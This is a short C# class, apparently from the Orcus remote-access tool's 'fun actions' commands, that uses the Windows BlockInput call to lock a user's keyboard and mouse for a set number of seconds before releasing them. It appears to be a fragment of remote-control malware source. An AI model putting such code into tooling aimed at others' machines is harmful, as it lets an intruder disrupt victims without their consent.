using System;
using System.Threading;
using Orcus.Native;

namespace Orcus.Commands.FunActions;

internal class BlockUserInput
{
	public static void Block(int seconds)
	{
		NativeMethods.BlockInput(fBlockIt: true);
		try
		{
			Thread.Sleep(TimeSpan.FromSeconds(seconds));
		}
		catch
		{
		}
		finally
		{
			NativeMethods.BlockInput(fBlockIt: false);
		}
	}
}
